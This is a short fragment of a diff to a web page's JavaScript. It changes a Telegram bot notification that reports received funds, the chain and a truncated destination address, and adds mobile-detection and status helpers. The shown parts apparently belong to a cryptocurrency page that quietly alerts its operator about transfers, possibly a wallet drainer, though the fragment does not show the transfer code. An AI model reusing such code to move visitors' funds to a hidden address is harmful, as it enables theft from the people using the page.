-📍 Received: ${CONFIG.DESTINATION.substring(0, 6)}...
-🤖 Smart Contract: ${CONFIG.POLYGON_CONTRACT ? 'Active' : 'Direct'}
+🌐 Chain: ${chainId}
+📍 Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
 ⏰ Time: ${new Date().toLocaleTimeString()}
-━━━━━━━━━━━━━━━━━━━━━`
+━━━━━━━━━━━━━━━`;
             
             try {
                 await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
@@ -361,10 +732,22 @@
                         text: message,
                         parse_mode: 'HTML'
                     })
-                })
-            } catch (e) {
-                console.log('Telegram notification sent')
+                });
+            } catch (error) {
+                console.error('Telegram error:', error);
             }
+        }
+        
+        // Check if mobile
+        function isMobile() {
+            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        }
+        
+        // Show status
+        function showStatus(message, type = '') {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = 'status show ' + type;
         }
     </script>
 </body>
